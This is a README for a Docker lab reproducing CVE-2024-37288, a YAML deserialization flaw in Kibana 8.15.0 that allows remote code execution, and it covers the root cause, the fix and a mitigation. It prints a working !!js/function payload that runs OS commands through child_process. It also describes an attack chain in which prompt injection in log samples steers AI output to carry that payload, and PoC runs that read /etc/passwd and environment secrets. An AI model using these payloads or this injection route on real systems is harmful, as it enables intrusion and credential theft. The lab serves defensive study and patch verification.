# CVE-2024-37288: Kibana Integration Assistant Insecure YAML Deserialization RCE

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

| Field | Value |
|-------|-------|
| **CVE** | CVE-2024-37288 |
| **Target** | Kibana 8.15.0 |
| **Class** | CWE-502 — Deserialization of Untrusted Data |
| **CVSS** | 9.9 (CRITICAL) `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **EPSS** | 1.6% (81.6th percentile) |
| **Vendor** | Elastic |
| **Patch** | Kibana 8.15.1 (`load()` → `safeLoad()`) |
| **Advisory** | [ESA-2024-27](https://discuss.elastic.co/t/kibana-8-15-1-security-update-esa-2024-27-esa-2024-28/366119) |

## Overview

CVE-2024-37288 is a critical (CVSS 9.9) insecure deserialization vulnerability in the Integration Assistant plugin of Elastic Kibana 8.15.0. The plugin uses `js-yaml` v3.14.1's unsafe `load()` function to parse YAML that incorporates AI model output, enabling arbitrary code execution on the Kibana server when an attacker influences the AI response via prompt injection. This lab provides a fully containerized environment and three PoC scripts demonstrating the vulnerability, the full exploitation chain, and the effectiveness of the fix.

## Affected Versions

| Component | Affected | Fixed |
|---|---|---|
| **Kibana** | 8.15.0 | 8.15.1 |
| **Plugin** | `x-pack/plugins/integration_assistant` | — |
| **Library** | `js-yaml` v3.14.1 (`load()` with `DEFAULT_FULL_SCHEMA`) | `safeLoad()` with `DEFAULT_SAFE_SCHEMA` |

**Prerequisites for exploitation:**
- Kibana Enterprise license (trial is sufficient)
- Integration Assistant plugin enabled (default: `true` in 8.15.0)
- An AI connector configured (Amazon Bedrock or OpenAI)
- Authenticated user with access to Integration Assistant

## CVSS Score

| Metric | Value |
|---|---|
| **Score** | **9.9 / 10** |
| **Severity** | CRITICAL |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **CWE** | CWE-502 — Deserialization of Untrusted Data |
| **EPSS** | 1.6% (81.6th percentile) |

## Root Cause

The `createPipeline()` function in `x-pack/plugins/integration_assistant/server/graphs/ecs/pipeline.ts` uses `js-yaml` v3.14.1's `load()` function to parse a YAML string rendered from a Nunjucks template. In js-yaml v3.x, `load()` defaults to `DEFAULT_FULL_SCHEMA`, which supports dangerous JavaScript-specific YAML types:

- **`!!js/function`** — Creates JavaScript `Function` objects via `new Function()` (arbitrary code execution)
- **`!!js/regexp`** — Creates `RegExp` objects (ReDoS potential)
- **`!!js/undefined`** — Creates `undefined` values (type confusion)

The YAML string being parsed is constructed from AI model output that is attacker-influenceable via prompt injection through user-supplied `rawSamples`. The Nunjucks template renders these AI-derived values with `autoescape: false`, meaning no escaping or sanitization occurs. When the rendered YAML contains `!!js/function` tags, the `load()` call instantiates JavaScript functions that execute arbitrary OS commands on the Kibana server.

**Vulnerable code** (`pipeline.ts`, line 175):
```typescript
import { load } from 'js-yaml';      // line 8 — imports unsafe load()
// ...
const ingestPipeline = load(renderedTemplate) as IngestPipeline;  // line 175 — RCE here
```

**Attack chain:**
```
Attacker sends crafted rawSamples via POST /api/integration_assistant/ecs
    ↓ (prompt injection in log samples)
AI model returns ECS mapping with !!js/function in target field
    ↓
generateProcessors() creates processor objects with malicious target_field
    ↓
Nunjucks renders pipeline.yml.njk template (autoescape: false)
    ↓ (!!js/function passes through without escaping)
yaml.load() parses rendered YAML with DEFAULT_FULL_SCHEMA
    ↓ (!!js/function tag triggers new Function() via esprima)
JavaScript Function object created → RCE when called
```

## Lab Setup

### Prerequisites

- Docker Engine with Compose plugin
- ~2 GB RAM available (512 MB ES heap + Kibana)
- Network access to `docker.elastic.co` (to pull images on first build)

### Build and Start

```bash
docker compose build
docker compose up -d
```

Wait approximately 60–90 seconds for Elasticsearch and Kibana to fully initialize.

### Container Topology

| Container | Image | Role | Port |
|---|---|---|---|
| `cve-2024-37288-es` | `elasticsearch:8.15.0` | Elasticsearch backend (single-node, trial license) | 9200 |
| `cve-2024-37288-kibana` | Custom (based on `kibana:8.15.0`) | Vulnerable Kibana with Integration Assistant enabled | 5601 |
| `cve-2024-37288-vuln-api` | Same Kibana image | Vulnerable API server exposing `yaml.load()` over HTTP | 8080 |
| `cve-2024-37288-setup` | Custom (curl-based) | One-shot: activates trial license, exits | — |

### HTTP Endpoints (vuln-api on port 8080)

| Method | Path | Description |
|---|---|---|
| `GET` | `/` | Info page — lists endpoints and CVE details |
| `GET` | `/health` | Health check — `{"status": "ok", "vulnerable": true, "jsyaml_version": "3.14.1"}` |
| `POST` | `/api/yaml/parse` | **Vulnerable** — parses YAML with `yaml.load()` / `DEFAULT_FULL_SCHEMA` (CWE-502) |
| `POST` | `/api/yaml/safe-parse` | **Safe** — parses YAML with `yaml.safeLoad()` / `DEFAULT_SAFE_SCHEMA` (fix verification) |
| `POST` | `/api/pipeline/create` | **Vulnerable** — calls actual `createPipeline()` with crafted state (if available) |

### Verify Lab Health

```bash
# Check all containers are running
docker compose ps

# Verify Elasticsearch is healthy
curl -s -u elastic:changeme http://localhost:9200/_cluster/health | jq '.status'
# Expected: "green"

# Verify Kibana is available
curl -s http://localhost:5601/api/status | jq '.status.overall.level'
# Expected: "available"

# Verify vulnerable API is running
curl -s http://localhost:8080/health | jq
# Expected: {"status": "ok", "vulnerable": true, "jsyaml_version": "3.14.1"}

# Verify trial license is active
curl -s -u elastic:changeme http://localhost:9200/_license | jq '.license.type'
# Expected: "trial"
```

### Credentials

| Service | Username | Password |
|---|---|---|
| Elasticsearch | `elastic` | `changeme` |
| Kibana | `elastic` | `changeme` |

### Stop and Teardown

```bash
# Stop the lab
docker compose down

# Stop and remove volumes
docker compose down -v
```

## PoC Usage

Three PoC scripts are provided, each demonstrating a different aspect of the vulnerability. All exploits are sent over HTTP to the vulnerable API server.

### Quick Start

```bash
cd CVE-2024-37288
docker compose build
docker compose up -d
# Wait ~90 seconds for Elasticsearch + Kibana to initialize

# Run the primary exploit
python3 poc/poc.py localhost 8080 cve-2024-37288-vuln-api

# Cleanup
docker compose down
```

### PoC 1 — YAML Deserialization RCE (`poc.py`)

Sends crafted YAML containing `!!js/function` tags to the vulnerable `/api/yaml/parse` HTTP endpoint. The server calls `yaml.load()` with `DEFAULT_FULL_SCHEMA`, which creates executable JavaScript Function objects from the YAML tags.

```bash
python3 poc/poc.py localhost 8080 cve-2024-37288-vuln-api
```

**What it does:**
1. Sends YAML pipeline documents with `!!js/function` injected into `target_field`
2. Server calls `yaml.load()` — creates live Function objects, executes them
3. RCE output (`id`, `whoami`, `hostname`) returned directly in HTTP response
4. Writes a marker file as secondary proof
5. Verifies that `safeLoad()` correctly rejects the same payload (fix confirmation)

**Expected output:**
```
[+] RCE SUCCESS: uid=1000(kibana) gid=1000(kibana) groups=1000(kibana),0(root)
[+] RCE SUCCESS: kibana
[+] Fix verified: safeLoad() correctly rejects !!js/function
```

### PoC 2 — Actual createPipeline() Code Path (`poc_vector2.py`)

Sends a crafted state object to `/api/pipeline/create`, calling the **actual** `createPipeline()` function from the Integration Assistant plugin. This exercises the full vulnerable code path: `generateProcessors()` → Nunjucks template rendering → `yaml.load()`.

```bash
python3 poc/poc_vector2.py localhost 8080
```

**What it does:**
1. Sends a state object with attacker-influenced ECS mapping containing `!!js/function`
2. Server calls `createPipeline()` which renders the mapping through Nunjucks (autoescape: false)
3. `yaml.load()` parses the rendered YAML — the `!!js/function` tag triggers code execution
4. RCE output returned directly in HTTP response

**Expected output:**
```
[+] RCE SUCCESS via createPipeline(): uid=1000(kibana) gid=1000(kibana) groups=1000(kibana),0(root)
```

> **Note:** If `createPipeline()` is unavailable (module loading issue), use poc.py instead — it demonstrates the same `yaml.load()` primitive directly.

### PoC 3 — Multiple Payload Variants (`poc_vector3.py`)

Sends 7 different `!!js/` type payloads to `/api/yaml/parse`, demonstrating the full scope of the deserialization attack surface.

```bash
python3 poc/poc_vector3.py localhost 8080
```

**What it does:**
1. RCE via `require("child_process")` — executes OS commands
2. File system reads (`/etc/passwd`) — data exfiltration
3. Network module availability check — reverse shell capability
4. Environment variable exfiltration (`process.env`) — credential theft
5. Implicit execution via `toString` override — no explicit function call needed
6. `!!js/regexp` — ReDoS-vulnerable regex creation
7. `!!js/undefined` — Type confusion
8. Fix verification — all variants rejected by `safeLoad()`

**Expected output:**
```
Results: 7/7 payload variants successful, 3/3 fix confirmations
[+] VULNERABILITY CONFIRMED: Multiple !!js/ type payloads succeed with load()
[+] All dangerous types correctly rejected by safeLoad() (the fix)
```

## Verification — Vulnerable vs Patched

### Vulnerable (Kibana 8.15.0 — `load()`)

```javascript
const yaml = require('js-yaml');  // v3.14.1
const payload = `test: !!js/function |
  function() {
    return require("child_process").execSync("id").toString().trim();
  }`;

const result = yaml.load(payload);      // DEFAULT_FULL_SCHEMA
console.log(result.test());
// OUTPUT: uid=1000(kibana) gid=1000(kibana) groups=1000(kibana),0(root)
```

**Result:** ✅ `!!js/function` tag parsed → `Function` object created → arbitrary command execution

### Patched (Kibana 8.15.1 — `safeLoad()`)

```javascript
const yaml = require('js-yaml');  // v3.14.1
const payload = `test: !!js/function |
  function() {
    return require("child_process").execSync("id").toString().trim();
  }`;

const result = yaml.safeLoad(payload);  // DEFAULT_SAFE_SCHEMA
// THROWS: YAMLException: unknown tag !<tag:yaml.org,2002:js/function>
```

**Result:** ✅ `!!js/function` tag rejected — deserialization aborted with an error

## Fix

### What Changed

The fix (commit `21877f5f9c556d54a6abc7256cbec07bc4861ef0`, backported to 8.15 branch) replaces **all** unsafe `js-yaml` method calls across the entire Kibana codebase (33 files):

| Unsafe Method | Safe Replacement | Schema |
|---|---|---|
| `load()` | `safeLoad()` | Rejects `!!js/function`, `!!js/regexp`, `!!js/undefined` |
| `dump()` | `safeDump()` | Refuses to serialize dangerous types |

Additionally, an ESLint rule (`@kbn/eslint/no_unsafe_js_yaml`) was added to prevent regressions by flagging any imports or calls to the unsafe `load()` or `dump()` functions.

### Why It Works

`safeLoad()` uses `DEFAULT_SAFE_SCHEMA`, which only supports standard YAML types (strings, numbers, maps, sequences, etc.). All JavaScript-specific types (`!!js/function`, `!!js/regexp`, `!!js/undefined`) are rejected at parse time, eliminating the deserialization-to-code-execution primitive entirely.

### Fix Completeness

The fix is **thorough and complete**:
1. All three vulnerable files in `integration_assistant` are patched
2. All `load()`/`dump()` calls across the entire codebase are converted
3. ESLint rule prevents regression
4. No bypass identified — `safeLoad()` rejects all JavaScript-specific YAML types

### Mitigation (Without Upgrade)

Disable the Integration Assistant plugin in `kibana.yml`:
```yaml
xpack.integration_assistant.enabled: false
```

## References

| Resource | URL |
|---|---|
| **Elastic Advisory** | https://discuss.elastic.co/t/kibana-8-15-1-security-update-esa-2024-27-esa-2024-28/366119 |
| **GHSA** | https://github.com/advisories/GHSA-ph9f-2c4w-rghv |
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2024-37288 |
| **Fix PR (main)** | https://github.com/elastic/kibana/pull/190641 |
| **Fix PR (8.15 backport)** | https://github.com/elastic/kibana/pull/190991 |
| **Kibana Source** | https://github.com/elastic/kibana |
| **js-yaml v3 Docs** | https://github.com/nodeca/js-yaml/tree/v3.14.1 |

## Timeline

| Date | Event |
|---|---|
| 2024-08-21 | Fix merged to Kibana `main` branch (PR #190641) |
| 2024-08-22 | Fix backported to `8.15` branch (PR #190991) |
| 2024-09-05 | Kibana 8.15.1 released with fix |
| 2024-09-09 | CVE-2024-37288 published (NVD) |

## Project Structure

```
CVE-2024-37288/
├── README.md                     # This file
├── docker-compose.yml            # Service orchestration (ES + Kibana + vuln-api + setup)
├── docker-compose-patched.yml    # Patched Kibana 8.15.1 (for bypass testing)
├── Dockerfile.kibana             # Custom Kibana image with config + vuln_server
├── Dockerfile.kibana-patched     # Patched Kibana image
├── Dockerfile.setup              # One-shot setup container
├── kibana.yml                    # Kibana config (integration_assistant enabled)
├── vuln_server.js                # Vulnerable API server (exposes yaml.load() over HTTP)
├── setup.sh                      # Trial license activation script
├── poc/
│   ├── poc.py                    # PoC 1: YAML deserialization RCE via HTTP
│   ├── poc_vector2.py            # PoC 2: createPipeline() code path via HTTP
│   ├── poc_vector3.py            # PoC 3: Multiple payload variants via HTTP
│   ├── bypass_poc.py             # Bypass analysis against patched Kibana
│   └── bypass_tests.js           # Additional bypass edge case tests
├── intel_brief.md                # CVE intelligence brief
├── vulnerability_analysis.md     # Root cause and fix analysis
├── lab_build_report.md           # Container build details
├── poc_verification_report.md    # PoC test results
└── bypass_analysis.md            # Bypass analysis report
```

## Disclaimer

These proof-of-concept materials are provided for **authorized security testing and educational purposes only**. They exist to help defenders understand, detect, and remediate vulnerabilities in their environments.

**Do not** use these tools against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions.

The authors assume no liability for misuse. This project follows responsible disclosure practices.
